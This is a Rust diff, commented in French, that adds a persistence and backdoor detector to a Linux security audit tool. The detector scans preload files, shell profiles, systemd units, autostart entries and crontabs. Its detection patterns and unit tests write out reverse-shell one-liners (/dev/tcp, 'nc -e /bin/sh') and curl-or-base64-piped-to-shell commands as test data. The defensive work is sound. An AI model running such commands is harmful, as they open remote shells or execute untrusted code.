@@ -1601,6 +1601,333 @@ fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<Strin
         .collect()
 }
 
+/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
+fn commentaire(ligne: &str) -> bool {
+    let l = ligne.trim_start();
+    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
+}
+
+/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
+const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
+    ".local",
+    ".config",
+    ".cargo",
+    ".rustup",
+    ".nix-profile",
+    ".npm-global",
+    ".bun",
+    ".deno",
+    ".dotnet",
+    ".steam",
+];
+
+/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
+/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
+/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
+fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
+    let mots: Vec<&str> = commande.split_whitespace().collect();
+    let a = |m: &str| mots.iter().any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m);
+    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
+        return Some("connexion réseau ouverte par le shell (shell inversé)");
+    }
+    if (a("nc") || a("ncat") || a("netcat")) && (a("-e") || a("-c")) {
+        return Some("netcat qui donne un shell (shell inversé)");
+    }
+    if (commande.contains("curl") || commande.contains("wget"))
+        && commande.split('|').skip(1).any(|suite| {
+            let prog = suite.split_whitespace().next().unwrap_or("");
+            ["sh", "bash", "zsh", "dash", "python", "python3", "perl"].contains(&prog.rsplit('/').next().unwrap_or(""))
+        })
+    {
+        return Some("télécharge un script et l'exécute aussitôt");
+    }
+    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
+        return Some("commande cachée en base64");
+    }
+    if !lancement {
+        return None;
+    }
+    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
+    let programme = mots
+        .first()?
+        .trim_matches(|c| c == '"' || c == '\'')
+        .trim_start_matches(['-', '@', '+', '!', ':']);
+    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
+        .iter()
+        .any(|d| programme.starts_with(d))
+    {
+        return Some("programme lancé depuis un dossier temporaire");
+    }
+    let maison = home();
+    let relatif = programme
+        .strip_prefix("~/")
+        .or_else(|| programme.strip_prefix("$HOME/"))
+        .or_else(|| programme.strip_prefix("%h/"))
+        .or_else(|| {
+            (!maison.is_empty())
+                .then(|| programme.strip_prefix(&format!("{maison}/")))
+                .flatten()
+        });
+    if let Some(r) = relatif {
+        let premier = r.split('/').next().unwrap_or("");
+        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
+            return Some("programme rangé dans un dossier caché du dossier personnel");
+        }
+    }
+    None
+}
+
+/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
+/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
+fn commande_lancee(ligne: &str) -> Option<String> {
+    let l = ligne.trim();
+    if commentaire(l) {
+        return None;
+    }
+    if let Some((cle, valeur)) = l.split_once('=') {
+        let cle = cle.trim();
+        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
+            return Some(valeur.trim().to_string());
+        }
+    }
+    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
+        .iter()
+        .any(|m| l.contains(m))
+    {
+        let debut = l.find(['"', '\''])?;
+        let fin = l.rfind(['"', '\''])?;
+        return (fin > debut).then(|| l[debut + 1..fin].to_string());
+    }
+    None
+}
+
+/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
+fn definit_prechargement(ligne: &str) -> bool {
+    !commentaire(ligne)
+        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
+        && !ligne.trim_start().starts_with("unset")
+}
+
+/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), sans suivre les liens d'activation.
+fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
+    let mut trouve = Vec::new();
+    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
+        let p = e.path();
+        let Ok(t) = e.file_type() else { continue };
+        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
+            trouve.extend(fichiers_de(&p, extensions));
+        } else if t.is_file() && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
+            trouve.push(p);
+        }
+    }
+    trouve
+}
+
+/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
+/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
+fn persistance() -> Vec<Constat> {
+    const CAT: &str = "Persistance";
+    let h = std::path::PathBuf::from(home());
+    let gestion = Paquets::detecter();
+    let mut critiques = Vec::new();
+    let mut suspects = Vec::new();
+
+    // /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris.
+    // Technique classique des rootkits ; presque aucun système normal n'en a.
+    if let Ok(texte) = std::fs::read_to_string("/etc/ld.so.preload") {
+        for lib in texte
+            .lines()
+            .filter(|l| !commentaire(l))
+            .flat_map(str::split_whitespace)
+        {
+            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
+            if connue {
+                suspects.push(format!("/etc/ld.so.preload charge {lib} dans tous les programmes"));
+            } else {
+                critiques.push(format!(
+                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes"
+                ));
+            }
+        }
+    }
+    for var in ["LD_PRELOAD", "LD_AUDIT"] {
+        if let Some(v) = std::env::var_os(var).filter(|v| !v.is_empty()) {
+            suspects.push(format!("{var}={} est défini pour cette session", v.to_string_lossy()));
+        }
+    }
+
+    let mut configuration: Vec<std::path::PathBuf> = [
+        "/etc/environment",
+        "/etc/profile",
+        "/etc/bash.bashrc",
+        "/etc/zsh/zshenv",
+        "/etc/zsh/zprofile",
+    ]
+    .iter()
+    .map(std::path::PathBuf::from)
+    .collect();
+    configuration.extend(fichiers_de(Path::new("/etc/profile.d"), &["sh", "zsh"]));
+    configuration.extend(fichiers_de(Path::new("/etc/environment.d"), &["conf"]));
+    configuration.extend(
+        [
+            ".profile",
+            ".bash_profile",
+            ".bashrc",
+            ".zshrc",
+            ".zshenv",
+            ".zprofile",
+            ".xprofile",
+        ]
+        .iter()
+        .map(|f| h.join(f)),
+    );
+    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
+    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
+    for f in std::fs::read_dir(h.join(".config/uwsm"))
+        .into_iter()
+        .flatten()
+        .flatten()
+    {
+        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
+            configuration.push(f.path());
+        }
+    }
+
+    // Fichiers dont des lignes lancent des programmes.
+    let mut demarrage = fichiers_de(
+        Path::new("/etc/systemd/system"),
+        &["service", "timer", "socket", "path", "conf"],
+    );
+    demarrage.retain(|p| !p.is_symlink());
+    demarrage.extend(fichiers_de(
+        &h.join(".config/systemd/user"),
+        &["service", "timer", "socket", "path", "conf"],
+    ));
+    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
+    demarrage.extend(fichiers_de(Path::new("/etc/xdg/autostart"), &["desktop"]));
+    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
+    demarrage.extend(hypr.iter().cloned());
+    configuration.extend(hypr);
+
+    let court = |p: &Path| {
+        p.strip_prefix(&h)
+            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display()))
+    };
+    for f in &configuration {
+        let Ok(texte) = std::fs::read_to_string(f) else {
+            continue;
+        };
+        for (n, l) in texte.lines().enumerate() {
+            if definit_prechargement(l) {
+                suspects.push(format!(
+                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
+                    court(f),
+                    n + 1
+                ));
+            } else if !commentaire(l)
+                && !demarrage.contains(f)
+                && let Some(raison) = commande_suspecte(l, false)
+            {
+                suspects.push(format!("{}:{} : {raison}", court(f), n + 1));
+            }
+        }
+    }
+    for f in &demarrage {
+        let Ok(texte) = std::fs::read_to_string(f) else {
+            continue;
+        };
+        for (n, l) in texte.lines().enumerate() {
+            if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
+                suspects.push(format!("{}:{} : {raison}", court(f), n + 1));
+            }
+        }
+    }
+    // crontab de l'utilisateur et du système : chaque ligne est une commande.
+    let mut cron: Vec<(String, String)> = sortie("crontab", &["-l"])
+        .unwrap_or_default()
+        .lines()
+        .map(|l| ("crontab".to_string(), l.to_string()))
+        .collect();
+    let mut fichiers_cron = vec![std::path::PathBuf::from("/etc/crontab")];
+    fichiers_cron.extend(
+        std::fs::read_dir("/etc/cron.d")
+            .into_iter()
+            .flatten()
+            .flatten()
+            .map(|e| e.path()),
+    );
+    for f in fichiers_cron {
+        for l in std::fs::read_to_string(&f).unwrap_or_default().lines() {
+            cron.push((f.display().to_string(), l.to_string()));
+        }
+    }
+    for (source, l) in cron.iter().filter(|(_, l)| !commentaire(l)) {
+        if let Some(raison) = commande_suspecte(l, false) {
+            suspects.push(format!("{source} : {raison}"));
+        }
+    }
+
+    let mut constats = Vec::new();
+    suspects.sort();
+    suspects.dedup();
+    if critiques.is_empty() && suspects.is_empty() {
+        constats.push(ok(
+            CAT,
+            "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
+        ));
+    } else {
+        let niveau = if critiques.is_empty() {
+            Niveau::Eleve
+        } else {
+            Niveau::Critique
+        };
+        let mut liste = critiques;
+        liste.extend(suspects);
+        let reste = liste.len().saturating_sub(6);
+        liste.truncate(6);
+        let mut message = format!("Lancement automatique suspect : {}", liste.join(" ; "));
+        if reste > 0 {
+            let _ = write!(message, " ; et {reste} autre(s)");
+        }
+        message.push('.');
+        constats.push(alerte(CAT, niveau, message).manuel(
+            "Ne rien lancer : lire chaque ligne signalée et supprimer celles que tu n'as pas ajoutées, puis lancer l'antivirus",
+            &[],
+        ));
+    }
+
+    // Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root.
+    // On les nomme pour que tu les reconnaisses, sans baisser la note.
+    if let Some(gestion) = gestion {
+        let mut maison: Vec<String> = fichiers_de(Path::new("/etc/systemd/system"), &["service", "timer"])
+            .into_iter()
+            .filter(|p| p.parent() == Some(Path::new("/etc/systemd/system")) && !p.is_symlink())
+            .filter(|p| !gestion.possede(p))
+            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
+            .collect();
+        maison.sort();
+        if !maison.is_empty() {
+            let premier = maison[0].clone();
+            constats.push(
+                alerte(
+                    CAT,
+                    Niveau::Info,
+                    format!(
+                        "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
+                        maison.len(),
+                        maison.join(", ")
+                    ),
+                )
+                .manuel(
+                    "Si tu n'en reconnais pas un, lis ce qu'il lance avant de le désactiver",
+                    &[&format!("systemctl cat {premier}")],
+                ),
+            );
+        }
+    }
+    constats
+}
+
 /// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
 fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
     texte
@@ -2116,6 +2443,7 @@ pub fn auditer() -> Audit {
     constats.push(module_securite());
     constats.push(sauvegardes());
     constats.extend(fichiers_suspects());
+    constats.extend(persistance());
     constats.push(demarrage_securise());
     constats.extend(cles_ssh());
     constats.extend(fichiers_secrets());
@@ -2428,5 +2756,53 @@ mod tests {
         assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
         assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
         assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
+    }
+
+    #[test]
+    fn lancements_suspects() {
+        // Formes de porte dérobée reconnues partout.
+        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
+        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
+        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
+        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
+        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
+        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
+        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
+        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
+        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
+        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
+        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
+        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
+        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
+        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
+        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
+        assert!(commande_suspecte("%h/.cargo/bin/netscan surveiller", true).is_none());
+        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
+        assert!(commande_suspecte("cd /tmp/x", false).is_none());
+    }
+
+    #[test]
+    fn lignes_de_demarrage() {
+        assert_eq!(
+            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
+            Some("-/usr/bin/foo -x")
+        );
+        assert_eq!(
+            commande_lancee("Exec=steam -silent %U").as_deref(),
+            Some("steam -silent %U")
+        );
+        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
+        assert_eq!(
+            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
+            Some("~/.local/bin/plein-ecran")
+        );
+        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
+        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
+        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
+        assert_eq!(commande_lancee("Name=Steam"), None);
+        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
+        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
+        assert!(!definit_prechargement("unset LD_PRELOAD"));
+        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
     }
 }
